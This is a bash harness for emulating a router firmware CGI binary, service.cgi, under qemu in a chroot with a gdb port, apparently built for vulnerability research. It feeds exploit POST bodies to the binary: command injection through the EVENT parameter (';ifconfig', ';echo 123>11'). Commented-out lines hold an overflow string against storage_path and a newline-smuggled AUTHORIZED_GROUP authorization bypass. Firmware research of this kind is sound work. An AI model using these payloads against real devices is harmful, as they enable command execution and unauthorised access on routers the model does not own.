#!/bin/bash
# cgi_run.sh
# sudo ./cgi_run.sh

#INPUT=`python -c "print 'storage_path='+'B'*477472+'A'*4"`
INPUT=`python -c "print 'EVENT=;ifconfig%26'"`
INPUT=`python -c "print 'EVENT=;echo 123>11%26'"`

#INPUT="SERVICES=DEVICE.ACCOUNT&attack=ture%0aAUTHORIZED_GROUP=1"

LEN=$(echo $INPUT | wc -c)
PORT="1234"


if [ "$LEN" == "0" ] || [ "$INPUT" == "-h" ] || [ "$UID" != "0" ]
then
    echo -e "\nusage: sudo $0\n"
    exit 1
fi

cp $(which qemu-mipsel-static) ./qemu

echo "$INPUT"  | chroot .  ./qemu -0 "/service.cgi" -E CONTENT_LENGTH=$LEN -E CONTENT_TYPE="application/x-www-form-urlencoded"  -E REQUEST_METHOD="POST"  -E REQUEST_URI="/service.cgi" -E REMOTE_ADDR="127.0.0.1" -g $PORT ./htdocs/cgibin "/service.cgi" "/service.cgi" #2>/dev/null
echo "run ok"
#rm -f ./qemu
